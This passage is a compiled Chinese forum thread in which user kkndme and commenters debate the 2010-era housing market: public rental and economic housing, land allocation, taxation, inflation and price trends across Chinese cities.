<p>不把小鱼虾米泥鳅赶出池塘，市场无法控制，风险无法控制，公租房建设也无从谈起。</p>
<p>二套房首付提高到50%，第三套房停止贷款，小开发商的清理整顿，民营企业在招拍挂中无论价高价低都无法取得土地，等等一系列重拳直击小鱼虾米。</p>
<p>土地将回到国家队手中，这个世界将变得清爽。</p>
<p>让时光倒流到80、90年代，我们的dfzf守着蕴藏着巨大财富的金矿、锡矿、铜矿却过着贫穷的日子。</p>
<p>没有资金，矿山是没有办法变成财富的。</p>
<p>于是招商引资，为了gdp、为了解决就业问题，出台了各种优惠政策，于是外商堂而皇之的走进来了。成为了这些矿山的主人。</p>
<p>5年，7年或者10年，外商享受的免税期满的时候，外商卷着巨额财富走了，留下了一个个废弃的充满危险的大坑。这是血琳琳的教训，zf没有理由不吸取。</p>
<p>外资、私企、小业主总有一天会让他们清场，尽管这一天晚来了十几年。</p>
<p>在土地日益稀缺的今天，房租难道不是可持续产出的金矿？让炒房客、投资客、民企开发商见鬼去吧。</p>
<blockquote>
<h4 id="商品房和公租房的不同："><a href="#商品房和公租房的不同：" class="headerlink" title="商品房和公租房的不同："></a>商品房和公租房的不同：</h4><p><strong>中年不惑吗:</strong></p>
<p>有个疑问</p>
<p>商品房和公租房相比，优势在什么地方？</p>
<p>那些楼裂裂的商品房估计质量还不如公租房吧</p>
<p>楼主应该加一句，买质量好的商品房</p>
<p><strong>kkndme：</strong></p>
<p>商品房和公租房的区别实际就是土地性质的不同，一个是出让，一个是划拨。</p>
<p>出让那必须是招拍挂，那必须是天价。</p>
<p>划拨就基本算是白给，收钱就是象征性的意思意思。</p>
<p>是商品房还是公租房，土地的性质说了算，dfzf说了算。跟房屋质量没有关系。</p>
<p>一套房子假设20000一平，房子的价值也就占30%，剩余的都是土地的价值</p>
</blockquote>
<blockquote>
<p><strong>yjfsam：</strong></p>
<p>看新闻说,在经济适用房里提供一定数量的廉租房,而不是大量廉租房,经济适用房是可以购买的,而且是建在市中心附近。</p>
<p>如果是我,我当然是想买经济适用房,而廉租房又不多,这会不会跟楼主的意思有点不一样?</p>
<p>另外经济适用房在高价房附近推出,可以打压附近房价?</p>
<p><strong>kkndme:</strong></p>
<p>你认为建在市中心附近的经济适用房是给普通老百姓建的吗？是低收入群众有资格购买的吗？</p>
<p>经济适用房都是内部分配的，但一旦走进市场就可以牟取暴利了。</p>
<blockquote>
<p><strong>tjOOSAN：</strong></p>
<p>市中心的经适，就是叫做定向分配。就是 在这附近拆迁的人，住的！！</p>
<p>你非要说，有人谋私，我也不反对！但绝对不会多。</p>
<p><strong>kkndme:</strong></p>
<p>我估计是你理解错了，谋私和牟取暴利是两回事。<br>假设你是某市科级公务员，分到两套房子，以保障房的价格购买，但是却可以按照市场价格出售，只要一转手就可以进账几十万甚至上百万。<br>这就是分房双轨制给体制内有级别的员工带来的暴力机会。这跟谋私没有关系</p>
<p><strong>tjOOSAN：</strong></p>
<p>你。。我不知道你说这个是什么意思？</p>
<p>贪污腐败是少数。这是肯定存在的现象。但我现在讨论的是大众现象！</p>
<p>而且内部分房的们都要够一定级别！就算他们一人分三套，那根本对楼市没有影响的</p>
<p><strong>kkndme:</strong></p>
<p>我说的是房产双轨制，是一种制度，不是说个人的以权谋私。</p>
<p>房屋问题实际上是土地问题，当一少部分人群能够以很低的代价占有更多的土地，市场上的土地就会变得稀缺，价格就会上升。</p>
<p><strong>tjOOSAN：</strong></p>
<p>唉！~~ 那才能占多少土地啊~~ 。。一栋高层就能住300户 。那才多大点儿地儿啊</p>
<p>房价上升，是因为国企和制造业资金输入。加上适龄人口增加。<br>最最主要的是 大资本的进入~~ 那点内部分房。。。。唉。。</p>
</blockquote>
<p><strong>tjOOSAN：</strong></p>
<p>大哥！！我真服你了。。。。。。 </p>
<p>你知道 定向分配吗？？？就是只有拆迁户才有资格买的房子。不存在收入的问题！！</p>
<p>你纯粹是胡诌啊！我发现</p>
<p><strong>kkndme：</strong></p>
<p>兄弟，你一直比较鸡栋，呵呵</p>
<p>拆迁户的定向房属于另外的问题，作为有产阶级的拆迁户来说，部分是城市扩大化的受益者，而部分又是受害者，不能一概而论。时机不同，城市不同，境遇也不同。</p>
<p>但是有一点可以肯定，拆迁的目的，不是为了拆迁户过得更好更舒服。开发商愿意支付高额的拆迁费（只限于超大型文明的城市，许多城市拆迁户的补偿是很可怜的）而是有更大的利润可图。</p>
<p>zf为主导建设的市中心经济适用房也不仅仅为了拆迁户回迁，拆迁户回迁比例最多占小区总放量的30%，而其余的基本上是权贵房</p>
<p><strong>tjOOSAN：</strong></p>
<p>我可不激动！就是闲的没事，来找事吧！还算是正事！</p>
<p>你说的什么给权贵房，固然存在。但是比例太太少了！！你说的话，根本没有依据！<br>现在买限价房的和经济适用房的人，都要在报纸上公布姓名和住址。</p>
<p>而且只要不是太穷的，基本都希望拆迁！因为第一，给的钱多。 第二 可以有定向分配。而且还是好地段的房子！！</p>
<p><strong>kkndme:</strong></p>
<p>兄弟你还是去了解一下体制内分福利房的真相吧。</p>
<p>福利房占用的都是经济适用房的指标啊</p>
<p>真正向社会公示的保障房才有多少呢？相对于数量庞大的福利房，可以说凤毛麟角。</p>
<p>不了解真相就没有发言权啊</p>
<p>特别是在二三线城市，房源比一线相对略为宽松，一个有点级别的公务员，通常都是分两三套房，这些房子占用的都是保障房的指标，都是要统计入保障房数据的。</p>
<p>不信你可以问问身边的公务员、银行员工、垄断企业员工</p>
<p><strong>tjOOSAN：</strong></p>
<p>奥！你说的是，传说中的 国企员工啊！！<br>可你一开始却说得是 经济适用房！是你搞错了把？<br>国企员工分配房子的，也要够一定工龄！一定级别！不是谁都有的。好伐？<br>而且 现在中国地产，很大一部分就是国企投资的。</p>
<p>所以叫内部分配么！！国企分房，在中国的体制内是正常的！</p>
<p><strong>kkndme:</strong></p>
<p>传说中的上海人？</p>
<p>我没有搞错，体制内员工分配的福利房就是经济适用房。</p>
<p>我举个例子，昆明武警干部的福利房叫恒安新邻居，它的官方名称叫什么？</p>
<p>我告诉你，叫做“武警经济适用房小区”</p>
<p>你看到的内部分房，占用的都是经济适用房的指标，也就是占用的是：我们所说的为了解决民生问题的保障房的指标。</p>
<p><strong>tjOOSAN：</strong></p>
<p>那就是个别了！！而且注意看“干部”两个字。就是到一定级别的分房!这打几十年前就有了！ 错就错在他不该占用经济适用！！ </p>
<p>说到底，不就是武警省钱么</p>
<p>现在买经济适用的人，都会上报纸！</p>
</blockquote>
<h2 id="通过征税调节贫富差距是耍流氓（因为富的人负责制定政策，富的人不会让政策针对自己）"><a href="#通过征税调节贫富差距是耍流氓（因为富的人负责制定政策，富的人不会让政策针对自己）" class="headerlink" title="通过征税调节贫富差距是耍流氓（因为富的人负责制定政策，富的人不会让政策针对自己）"></a>通过征税调节贫富差距是耍流氓（因为富的人负责制定政策，富的人不会让政策针对自己）</h2><p>今天看到搜狐上一篇文章说道要通过征税来调节贫富差距，提出这个方案的人不知是无知还是故意，如果zf听了这种无耻参谋的建议，不知道多少老百姓会活的更惨。</p>
<p>假设出台又一个新税种，无乱它叫什么，我们暂定为财产税。既然有了新税种，就要定任务，那好了为了这个税种制定了年上缴多少多少的任务。</p>
<p>实操的时候，执行的工作人员发现一旦轮到权贵脑袋上的事就没办法执行，你执行，他先让你下课。</p>
<p>但是任务必须完成，那还是从普通老百姓身上打主意吧。于是政策就完全走样了，非但起不了劫富济贫的目的，反而加重了穷人的负担。</p>
<p>往近里说，个人所得税，挣的是谁的税？权贵没看见交，月薪3000块的工薪层可一个都跑不了。</p>
<p>3000块月薪上缴的个人所得税你看着不多，可对于养孩子糊口的老百姓来说，哪怕10块钱都是重要的。他们可没有资本象月薪上万的小资一样动不动花500块钱泡个吧。</p>
<p>个人所得税是有任务的，工作人员必须完成任务，税别管是局级干部交的，还是连孩子幼儿园都上不起的穷光蛋交的，总之完成任务就是好样的。既然局长的税收不上来，就要从穷光蛋身上加倍收上来。</p>
<p>往远里说，王安石变法是怎么失败的，以史为鉴可以知得失。</p>
<p>王安石的初衷难道不是好的吗，可结果怎么样呢？只有一个——民不聊生。</p>
<p>书生误国啊。</p>
<h2 id="房价什么时候会涨"><a href="#房价什么时候会涨" class="headerlink" title="房价什么时候会涨"></a>房价什么时候会涨</h2><p>许多兄弟关心房价什么时候会涨？</p>
<p>那么先看看这次调控后都出现了什么样的现象。</p>
<p>1、全国房产成交量大幅下降<br>2、一线城市房价略有下跌，但并不持续，到现在基本跌不动了<br>3、多数二三线城市房价不跌反涨，成交量逐渐回升<br>4、大多数二线以上城市租金持续上涨<br>5、农产品价格有上涨迹象，大蒜、姜等小品种农产品遭遇爆炒。<br>6、变化莫测的政策导致精英阶层出现移民潮</p>
<p>农产品价格的上涨是很值得警惕的。想买房子但嫌房子贵的都市白领对农产品的价格很不敏感，但是金字塔最底层的最大多数群众是很敏感的。</p>
<p>领导们也很敏感。这牵扯到相当大比例人口的吃饭问题，稳定压倒一切。</p>
<p>农产品价格的抬头将会导致物价全面上涨，在不引起质变的前提下，房价作为商品也不例外。</p>
<p>这个引起质变的前提是出现饥荒的极端情况，这样的几率在现在社会很少。尽管干旱和洪涝使农产品大幅度减产，但是农产品还可以进口，国家还有粮食储备，保证全国人民填饱肚子还是不存在问题的。</p>
<p>一线城市仍然沉默，国家队在积极运动。二三线城市的房价上涨的成交量的回升却给了市场一个明确的信号。</p>
<p>这是资金运动的规律。国家队对一线城市的布局，迫使资金流向二三线城市。二三线城市相对（与一线城市相比）不高的价位给出了较大上升空间的预期。</p>
<p>全国富人买北京上海，全省富人买省会，房价的合理性已经不能用简单的本地平均收入来衡量。精英阶层的购买力才是关键。</p>
<p>明年物价进入持续上涨期是一个不容回避的问题。</p>
<p>在资金总量不变的前提下，巨量资金推动农产品价格上涨或者推动房价上涨是一个必须的选择。</p>
<p>今年zf用行政手段严厉打击蒜和绿豆价格的暴炒，基本上没有起到作用，资金有自己的运作规律，光靠拿张悟本出气也不能解决问题。</p>
<p>二三线城市的房价的上涨使与一线城市的差价缩小，为一线城市的发力提供了动能。</p>
<p>无论你喜欢还是不喜欢，都不是以人的意志为转移的</p>
<p>许多人心怀房价肯定会跌回2004年的美好愿望，刻舟求剑似的思维错过了一次次购房的机会。在患得患失中，在牛刀的号角声中，在任志强的大炮声中，迷失了自我。</p>
<p>任何事物都是有其规律性的。关键是否有一双慧眼能够穿透重重的迷雾。</p>
<p>假设你是个投资客，你非要去石家庄和长沙买房子，结果发现不怎么升值，怨天怨地：</p>
<p>石家庄作为一个二线省会怎么会不涨？</p>
<p>长沙的房价怎么那么低？</p>
<p>我们知道，北京的房子是全国有钱人买的，省会的房子是全省的有钱人买的。</p>
<p>但是当省会城市距离一线大城市在6个小时高速以内，省里的有钱人的资金就会流向一线大城市，而不是省会。</p>
<p>河北的富人一定会选择在北京投资房产，湖南的富人一定会选择广州深圳投资房产。</p>
<p>假设你是一个投资客，你去昆明旅行，发现昆明的房价甚至高过重庆，很不理解。你很疑惑昆明这么小的西部边陲城市投资价值在哪里？</p>
<p>昆明是云南省内唯一的大城市，且相邻的二线以上城市离云南省都比较远。云南地州资源丰富，虽然穷人占的比例大，富人的数量却也不少。昆明南有滇池，北有长虫山，作为一个700万人口的城市，土地资源非常稀缺。所以贵，一定有贵的原因。便宜一定有便宜的道理。</p>
<blockquote>
<h4 id="房价会不会涨要看地方政府的规划："><a href="#房价会不会涨要看地方政府的规划：" class="headerlink" title="房价会不会涨要看地方政府的规划："></a>房价会不会涨要看地方政府的规划：</h4><p><strong>zzz4697:</strong></p>
<p>楼主针对南昌的房价做个分析吗？从刚公布的100个城市房子均价看，南昌5k每平左右，是高了还是低了？</p>
<p><strong>kkndme:</strong></p>
<p>对于不了解的城市不敢妄下断言。没到现场调查就没有发言权啊。</p>
<p>房价会不会涨还要看dfzf的规划。</p>
<p>比如广州拥有大量的城中村，其周边有较多的大城市，广州的房价就比北京和上海低。如果广州的城中村一旦大规模拆迁，房价将会大幅上涨。</p>
<p>比如南宁东盟贸易自由港的概念使南宁的房价涨幅惊人。</p>
<p>南昌的地理位置，zf规划，发展前景，江西富裕人口的多少，都是决定房价的因素</p>
</blockquote>
<blockquote>
<h4 id="房价暴涨的底层逻辑："><a href="#房价暴涨的底层逻辑：" class="headerlink" title="房价暴涨的底层逻辑："></a>房价暴涨的底层逻辑：</h4><p><strong>tjOOSAN:</strong></p>
<p>。。。。。。暴涨之后。。。。。。<br>我们不就是第二个日本吗？</p>
<p>供求关系？供求关系，现在是谁在决定？国家！</p>
<p>国家的经济结构决定的。制造业的资金都进入房地产了。能不涨吗？普通人有几个可以够炒房资格的？</p>
<p>日本 当初也是供求关系！~~ 供求关系的根本也不应脱离，国家的经济实力！！</p>
<p>还暴涨？怎么涨？再涨都够去美国买房了！！ 你这不扯淡么</p>
<p><strong>Kkndme:</strong></p>
<p>中国和日本最大的不同在于日本的货币是开放的，中国的不是，是不能自由兑换的。</p>
<p>暴涨是相对于钱而言的，不是相对于实际购买力而言的。</p>
<p>80年代工资200多块钱一个月的时候，是不能想象90年代末北京城区5000每平米的房价的。那时候万元户已经是富人的代表了。</p>
<p>90年代末工资1000块钱的时候是不能想象现在30000一平米的房价的。90年代的100万绝对是富裕群体。可现在连个中产都算不上。</p>
<p>货币的持续贬值你没有考虑</p>
</blockquote>
<blockquote>
<h4 id="中国的土地稀缺吗？"><a href="#中国的土地稀缺吗？" class="headerlink" title="中国的土地稀缺吗？"></a>中国的土地稀缺吗？</h4><p><strong>tjOOSAN:</strong></p>
<p>在反驳楼主一句！！</p>
<p>在中国的土地，可不稀缺！~~ 只是没开发罢了！！</p>
<p>中国与世界不同！ok？13亿人！！用十三亿的居住权作为市场竞争的资本。</p>
<p>那太可怕了！真的！！！如果可能，中国绝对可以产出世界第一贵的地价！</p>
<p>为什么？这么多人需要房子。能不涨吗？</p>
<p>呵呵！多少有点扯淡！！别再提供求关系了！~~ 供求根本是平衡的！！</p>
<p><strong>kkndme:</strong></p>
<p>中国有13亿人口，960万平方公里土地，土地一点不稀缺。</p>
<p>但假设你在北京西城上班，让你去塔特拉马干买房子，你愿意去吗？</p>
<p>全国有点钱的都要在一线城市和省会城市买房子，所以才会稀缺。</p>
<p>大兴安岭有大量的土地，哪个有钱愿意跑去置业呢？</p>
<p>中国经济发展不平衡，牺牲全国大多数城市和乡村，来保证北上广深及大部分省会城市的繁荣才是造成土地稀缺的原因。</p>
<p>土地有的是，房子有的是，但好位置的土地和房子并不多。</p>
<p>一方面大量的小县城和乡镇、村庄人口锐减，因为缺乏谋生手段不得不背景离乡外出打工，另一方面超大型城市越来越拥挤，土地资源越来越稀缺。</p>
<p>这就是中国集中发展极少数标杆城市所造成的呀，也是因为如此，才造成了中国金子塔式的收入结构，贫富差距越来越悬殊。</p>
</blockquote>
<h2 id="为人民服务就是瞎掰"><a href="#为人民服务就是瞎掰" class="headerlink" title="为人民服务就是瞎掰"></a>为人民服务就是瞎掰</h2><p>很多人很疑惑，贪官越来越多，根本不把老百姓的利益放在心里，这些贪官即使被曝光了，还能继续当官。这是为什么呢？</p>
<p>首先理解一下老百姓，也就是民到底是什么？</p>
<p>民就是牛养，古代的时候，官员管理百姓叫做牧。官员管理百姓就是替君主放牧，只要保证牛羊不逃跑，不骚乱，那么就是合格的官员。</p>
<p>秦始皇暴政，百姓揭竿而起，可是陈胜起事后基本视民众如草芥，项羽屠杀平民比始皇更残暴。</p>
<p>萧何是一个很贤德的人，对百姓很好，赢得了很高的名声。刘邦在广武山和项羽对峙，得知了萧何在关中深受百姓爱戴，就疑心萧何要造反。一个君主爱民如子是为了百姓的支持，江山永固，一个臣子对老百姓好是不是要造反呢？于是派人去调查萧何。</p>
<p>萧何是个聪明人，感觉到刘邦已经不信任他了。于是赶紧改变工作作风，开始霸占百姓的田产，上大街欺负漂亮的妇女同志，并且派自己的子女上前线给刘邦做人质。</p>
<p>刘邦看到了萧何的行为非常高兴，知道萧何不会造反就放心了。</p>
<p>百姓不是牛羊是什么？</p>
<p>在红色高棉统治下的柬埔寨人，民连牛羊都不如呀。</p>
<p>波尔布特同志坚持gongchanzhuyi的按需分配，取消了货币。于是市场经济完全没有了。群众完全变成了按阶级分配了。</p>
<p>阶级只分为两种，波尔布特老板及其打手是绝对的统治阶级，其他人为被统治阶级，也可以称为奴隶阶级。</p>
<p>统治阶级对奴隶阶级不爽可以直接拿ak47突突。柬全国700万人口被波老板突突死了100万，当然不光是突突，还有活埋。</p>
<p>以至于越南派了10万军队侵略柬埔寨，受到了柬埔寨人民的夹道欢迎，称为解放人类的战争。</p>
<p>公道自在人心</p>
<p>博古才能通今，不了解历史无法治理国家，不了解历史也无法对事务有一个清楚的认识。</p>
<p>我们的今天本来就是历史的延续，前人经验和智慧的总结，不是一句话就可以抹杀的。</p>
<p>因为秦以后漫长帝国时代的大一统，才会把中央集权延续到现在。</p>
<p>而西方封建时代延续到地理大发现，诸侯割据王国、公国、侯国林立为现代的西方提供了民主制度的可能。</p>
<p>在制度上完全的不可比性，使向国际接轨成为了笑话。</p>
<p>我们看到的结果就是，物价上涨与西方接轨，甚至堂而皇之的超过西方，体制外的工资则与非洲结果，也算是国际化了。</p>
<blockquote>
<h4 id="政府安排的政策房的猫腻："><a href="#政府安排的政策房的猫腻：" class="headerlink" title="政府安排的政策房的猫腻："></a>政府安排的政策房的猫腻：</h4><p><strong>mellyzhang：</strong></p>
<p>大家听过那个西三旗的有名的限价房——旗胜家园吧<del>！外表看起来那么光鲜，地段也不是特别偏，紧邻城铁，当然是被人疯抢都抢不到的两限房呀</del>！还不是质量问题一大堆。</p>
<p>ZF安排的政策房也是要KFS建的，哪个KFS没肉吃还能保证把房子盖好？？！！所谓检测都TMD是虚的~。</p>
<p><strong>kkndme：</strong></p>
<p>这是肯定的，开发商都追求利润最大化。</p>
<p>zf建设两限房限制开发商利润，开发商必然偷工减料，zf都知道怎么回事，必须争一只眼闭一只眼，否则这个政策就执行不下去了</p>
</blockquote>
<p>对于渴望拥有一套产权住房的都市小白领对希望房价狂降已经到了歇斯底里的程度，他们赞成农产品价格放开，让资金炒作农产品，而离开房地产市场。</p>
<p>理由很简单，一套房子一涨就是几十万甚至上百万，而大米小麦，一斤就算涨到10块，也根本不能影响到自己的生活质量。</p>
<p>如果我国农产品价格是开放的，资金流向大米、小麦、猪肉，并且允许囤积，房地产一定会下跌的，这是毫无疑问的。</p>
<p>但是，我们看到的绝不是10块钱一斤的大米、小麦，而是500块钱、1000块钱一斤的大米、小麦。</p>
<p>我国将会出现大面积的饥荒，几千万甚至上亿的底层人士饿死街头，社会将出现大的动荡。</p>
<p>而产权房屋价格的上涨牺牲的主体只是体制外部分都市白领的利益，换来的不过是网络上没完没了的牢骚和咒骂。</p>
<p>巨量资金必须有地方去，如今面临的房地产和农产品之间的选择，你认为zf会怎么做？</p>
<p>体制内中层、高层可以分到多套福利房，低层至少能够分到一套保障房，即使最不重要部门的底层员工，搞到由单位补贴的公租房是没有问题的。</p>
<p>体制外的高层、中层，以他们的资金实力买多套房子都是不成问题的。</p>
<p>农民，分配有宅基地。国家要稳定，首先就是要农民稳定，因此我国只有农民能够分到土地自己盖房子。</p>
<p>军人，会享受到比公务员更好的福利，让军人享受更高标准的福利待遇，国家有深刻的认识。</p>
<p>那么只有体制外的都市中下层群众才是高房价的受害者，可是这个群体的地位真的很微不足道。</p>
<p>这些既无稳定工作（低层都市白领失业的概率还是蛮大的）又无自己的房产的都市小白领是金子塔底层被压榨的对象，甚至远远不如交通便利地区的农民。</p>
<p>没有这个群体的存在，金字塔上层的权贵是无法享受舒适的生活的。</p>
<p>社会需要底层群体用巨大的付出和极少的收获为金字塔上层群体服务。</p>
<p>当然，在巨大的付出后，有少数人会从低层脱颖而出，爬到金子塔的中层、甚至上层。</p>
<p>这些少数人带给了底层群体奋斗的希望。</p>
<p>拥有一套属于自己产权的房子，就只有一套路：从金字塔的底层往上爬。这条路很艰辛，并且会越来越艰辛，但总有希望。</p>
<blockquote>
<p><strong>天地间间：</strong></p>
<p>楼主有一点没说透彻，那就是白领的工资普遍较高，他们有能力买房子，但是受到几千年以来的小农经济思想的约束，他们普遍认为买房子不划算，占便宜心里普遍严重，别看他们外表光鲜，其实还都是一帮农民。</p>
<p><strong>kkndme：</strong></p>
<p>我说的是买不起房的低收入小白领</p>
<p>高薪白领不买房的不多吧，都是网上吹的吧。</p>
<p>高薪白领一般还是有自住房的，只是有人不愿意投资房产。每个人想法不同而已。</p>
<p><strong>天地间间：</strong></p>
<p>请问楼主所说的低薪白领一个月赚多少钱算底薪？</p>
<p>就拿我说吧，我06年买的房子，当时月薪3000元，这在当时算不算低薪？</p>
<p>但是我买房了，还是一个人买的，当然老爸赞助了点。每个月还完月供兜里就剩几十元，硬扛下来了。</p>
<p>目前年薪12万，我老婆年薪6万？这算不算高新？</p>
<p>如果我当时没买房子，以我们2个人的收入当下也买的起，只不过生活负担重一些。</p>
<p>所以请楼主明示，什么是低薪？</p>
<p><strong>kkndme:</strong></p>
<p>兄弟，你所描述的是另外一个问题。先说说你所说的这个问题，再谈谈什么叫低薪</p>
<p>先说06年你月薪3000买房子的问题。</p>
<p>我们打一个比方：</p>
<p>假设80年代，咱们两个月薪都是100块。你喜欢清朝的瓷盘子，咬咬牙，一年用好不容易攒下的100块钱买了清朝瓷盘子。我喜欢缝纫机，用一年好不容易攒的钱买了一个缝纫机。</p>
<p>市场有价值发现功能。显然，80年代清代瓷盘子的价值没有得到发现。</p>
<p>进入90年代，随着社会的发展，社会财富的增加，钞票也大幅度增加。清代瓷盘子的市场价值发现出来了，瓷盘子价格开始大幅上涨，你的瓷盘子由100块涨到1000块。而我买的缝纫机已经淘汰了</p>
<p>瓷盘子具备投资品的一切属性，能够吸收社会的富裕资金，而缝纫机没有这个功能。</p>
<p>我很眼红，我虽然买的起这个瓷盘子（因为90年代我的工资由100涨到了800），但是我觉得价格太高了，没有买。而你的瓷盘子在90年代为你挣了900元钱。</p>
<p>时光又到21世纪，社会资金越来越多，钞票越印越多，可瓷盘子在市场上越来越少（都被收藏了），于是瓷盘子涨到了1千万一个，我即使想买瓷盘子再也买不起了，而不是嫌价格高的问题。</p>
<p>而你已经成为了千万富翁。那个瓷盘子也并没有因为1千万的价格实在太高而暴跌，相反价格仍以每年20%的速度增长。</p>
<p>06年你在房价价值发现的初期买了房子，就像90年代你用1000块买清代瓷盘子。</p>
<p>如果你的工资不变，或者变化不足够大，现在你将没不起房子，就像你在21世纪不可能买的起瓷盘子。</p>
<blockquote>
<p><strong>天地间间：</strong></p>
<p>楼主啊，你有一个概念错误：清代的瓷盘子是收藏品是古董，其价值是由拥有瓷盘子的收藏家决定的，而房子是商品（我指的是商品房，不是公租房之类的保障房），其价值远没有古董增值速度快，所以说收藏品和商品是有区别的。</p>
<blockquote>
<p><strong>kkndme:</strong><br>呵呵，商品房当然和清代磁盘是不同的，升值空间不同，投资对象也不同，但价值发现的道理是一样的。投资品的基本属性：稀缺性是共有的，当然稀缺的程度不同。</p>
<p>我所讲的是投资品的价值发现，而不是商品房&#x3D;清代瓷盘</p>
</blockquote>
<p>此外，您还没有正面回答我什么是低薪，我今年30多岁，如果我刚毕业肯定是拿底薪的，往最坏了想，我毕业几年到今年混的不好，今年只赚3000元一个月，我就买不起房么？</p>
<p>如果你觉得是，那么你错了，我仍然可以买的起，我会到比较偏远的地段去买房子，比如密云，延庆等买套小户型二手房，那里的房价我仍然可以支付月供，当然我还是要像老爸要点钱付首付的。</p>
<p>可是如果我不这么想，觉得去哪里不划算，在四环里买房子多好啊！那么我可能就买不起了，因为在四环里买房已经超出了我的能力，那么请问我买不起四环里的房子是房价的问题呢还是我的问题呢？是不是说我买不起四环里的房子就是我买不起房？<br>综上所述，每个人都有自己的能力极限，不同能力的人去不同的地段买房子，一味的强求自己做能力不及的事情，反而还怨天尤人的，这就是小农意识。</p>
<p>如有不详，愿同楼主共同切磋</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>如果我们买首套房，不是为了投资。我们买房总有个基本的要求：</p>
<p>有一个自己的家，并且上班相对方便。如果你在长城饭店上班，你跑去密云买个房子。首先你上班就成问题。</p>
<p>如果我月薪3000块，我甚至不能在密云买房子（因为也上万了），但我可以在山西的某个县城买套房子。问题是我买这套房子干什么？</p>
</blockquote>
</blockquote>
<p><strong>再说说收入高低</strong>，不同城市，不同消费水平，对收入高低有着不同的理解。</p>
<p>我们举北京为例。</p>
<p>反映真实居住成本的是房屋租金，而不是房价。</p>
<p>在北京生活，一家三口的通常情况</p>
<p>一个位置能够满足上班条件的两居室租金大约3000元，小孩花费没有3000块是下不来的，再加上夫妻俩2000元的基本生活花费，也就是说8000月收入的家庭，刚好能达到收支平衡。</p>
<p>如果是体制外的都市白领，这个收入是很可怜的，因为还要考虑到失业问题，并且应付万一发生的意外支出。所以每月能有2000元的结余是必须的，那么10000元是在北京生活的基本水平。</p>
<p>而购买商品房所支付的金钱是要远高于租金成本的，因为你买的不是房屋居住权，而是房屋的产权，一定会出现溢价。</p>
<p>如果你现在的家庭收入能够再买得起一套房子，那么你的收入水平应该至少是小康，甚至达到中产</p>
<p><strong>天地间间：</strong></p>
<p>楼主，一对有工作经验的年轻的北京白领夫妻月收入只有8000元？</p>
<p>这是怎么统计的？您的统计结果不准啊</p>
<p>我的结论是10000-12000元&#x2F;月是北京标准的白领夫妻的月收入，那么这笔钱能不能买房子？能，能不能付首付？可能不能，首付款怎么来的？一部分是父母赞助的。作为父母就要把自己的孩子扶上马，再送一程，这和啃老没关系</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>呵呵，这个也不好这么说，不同行业间的薪水差距实在太大了。</p>
<p>比如一个有6、7年职业学校的教师或者一个有5，6年电脑分销经验的产品经理（都是大学毕业），他们辛辛苦苦干一年多点的也就7、8万块。他们都不晓得招商银行随便一个客户经理轻轻松松年薪几十万。</p>
<p>同是大学毕业，同是5、6年工作经验，北京几十万年薪收入的人不少，但一个月只挣3、4000块的数量更庞大。</p>
</blockquote>
<p>我的中心思想是：</p>
<p>北京的白领普遍买的起房子，但是有一部分不买，其原因是想花最少的钱去获得最好的地段，最好的楼层，最好的朝向的房子，这是划算不划算的问题，不是买得起买不起的问题.</p>
<p>当然有的人会说：买房了，得病了怎么办？失业了怎么办？一大堆怎么办！那么请问：既然你知道早晚要见马克思，为什么现在还活着啊？一刀了断了算了，呵呵</p>
<p><strong>kkndme:</strong></p>
<p>你说的这类人其实是因为贪婪和恐惧，幸运不会垂青即贪婪又恐惧的人。用天涯的语言来说：就是传说中的傻空</p>
</blockquote>
<blockquote>
<h4 id="股市分析"><a href="#股市分析" class="headerlink" title="股市分析"></a>股市分析</h4><p><strong>新智战者:</strong></p>
<p>楼主对楼市的分析让人佩服！</p>
<p>能否谈谈股市？现在的股市不管涨跌，我只是看到ZF在疯狂的发行新股大盘股，压大盘是肯定的了，看样子又是下一盘很大的棋！</p>
<p><strong>kkndme:</strong></p>
<p>你要注意2010年的股市与以往是不同的。因为股指期货的出现。<br>要时刻关注股指期货投入的资金量。</p>
<p>当股指期货资金量足够大的时候（什么叫足够大就要看个人的判断了），期指将指导沪深300指数。大盘会跟着固执期货走</p>
</blockquote>
<blockquote>
<h4 id="报复性上涨："><a href="#报复性上涨：" class="headerlink" title="报复性上涨："></a>报复性上涨：</h4><p><strong>lfastro:</strong></p>
<p>“上帝欲使其灭亡，必先使其疯狂！”</p>
<p>很想看看“报复性上涨”是个什么样子。</p>
<p><strong>kkndme:</strong></p>
<p>你可以这样理解（只是为了理解方便做个示意）：<br>假设房价从2004年的4000一平，涨到2010年的20000一平<br>猪肉从2004年的6块一斤，涨到2010年的10块一斤。</p>
<p>但是如果房价2004年4000一平，到了2010年还是4000一平<br>那么，猪肉从2004年的6块一斤，将在2010年涨到30块一斤，不仅猪肉，还有大米，小麦，大蒜、葱、姜、房租都会翻几倍的价格。</p>
</blockquote>
<blockquote>
<h4 id="政府如何利用公租房垄断市场"><a href="#政府如何利用公租房垄断市场" class="headerlink" title="政府如何利用公租房垄断市场"></a>政府如何利用公租房垄断市场</h4><p><strong>中年不惑吗:</strong></p>
<p>政府要垄断房租市场？</p>
<p>市场上已有的和不断要产生的出租房源政府怎么让它们消失呢？</p>
<p>还是说政府要造足够多的公租房来占据市场主体，那就更难了，要花多少钱呀，公租房的地段好不了的</p>
<p><strong>kkndme:</strong></p>
<p>公租房将为房租市场树立一个标杆。有了这个标杆，私人出租房将会对比公租房做一个参照。</p>
<p>公租房是有限的，是需要申请的，而私人出租房会在相同位置将自己的房租定价高于公租房。</p>
<p>这样就保证了公租房的价格低于市场。</p>
<p>公租房不是廉租房，zf要持续赚钱，他的定价不会低，私人房就会定得更高，这将导致市场上的房租整体上涨。</p>
<p>公租房的吸引力在哪里？</p>
<p>1、对体制内会有单位补贴<br>2、对体制外人员可以提供一个较长的稳定租期。<br>3、zf定价的标杆作用，无论怎么定价，公租房都会低于周边市场价格.</p>
</blockquote>
<blockquote>
<h4 id="城中村注定要拆除消失"><a href="#城中村注定要拆除消失" class="headerlink" title="城中村注定要拆除消失"></a>城中村注定要拆除消失</h4><p><strong>中年不惑吗:</strong></p>
<p>城中村可是提供廉价房源的地方，这个公租房的竞争对手肯定要被政府干掉，所以城中村的拆迁改造那是一定的</p>
<p><strong>kkndme:</strong></p>
<p>城中村一定会消失的，不消灭城中村，哪来的GDP</p>
</blockquote>
<blockquote>
<h4 id="三四线城市和海南的发展"><a href="#三四线城市和海南的发展" class="headerlink" title="三四线城市和海南的发展"></a>三四线城市和海南的发展</h4><p><strong>alice_xg：</strong></p>
<p>楼主能否分析下未来三四线小城市的发展，是否会空心化</p>
<p>另外，请分析下海南的城市有没有投资价值</p>
<p><strong>kkndme：</strong></p>
